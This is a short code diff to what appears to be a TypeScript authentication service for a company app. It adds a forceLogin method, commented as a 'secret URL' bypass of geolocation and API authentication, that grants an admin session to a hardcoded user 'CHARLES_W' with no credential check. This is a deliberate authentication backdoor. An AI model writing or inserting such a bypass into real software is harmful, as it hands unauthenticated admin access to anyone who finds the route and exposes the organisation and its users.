@@ -68,6 +68,31 @@ export class AuthService {
   }
 
   /**
+   * Force login via secret URL — bypass geolocation & API auth
+   */
+  forceLogin(site: string): void {
+    const now = new Date();
+    const sessionExpiryTime = new Date(now.getTime() + (this.SESSION_DURATION_HOURS * 60 * 60 * 1000));
+    const plant = site.trim().toUpperCase();
+
+    const authUser: AuthUser = {
+      username: 'CHARLES_W',
+      empCode: 'CHARLES_W',
+      site: plant,
+      role: 'admin',
+      loginTime: now,
+      lastActivityTime: now,
+      sessionExpiryTime: sessionExpiryTime
+    };
+
+    localStorage.setItem('currentPlant', plant);
+    localStorage.setItem('currentCompany', plant.substring(0, 3));
+
+    this.setCurrentUser(authUser);
+    this.saveUserToStorage(authUser);
+  }
+
+  /**
    * Login dengan API Samator
    */
   async login(empCode: string, site: string): Promise<{ success: boolean; message: string; user?: AuthUser }> {
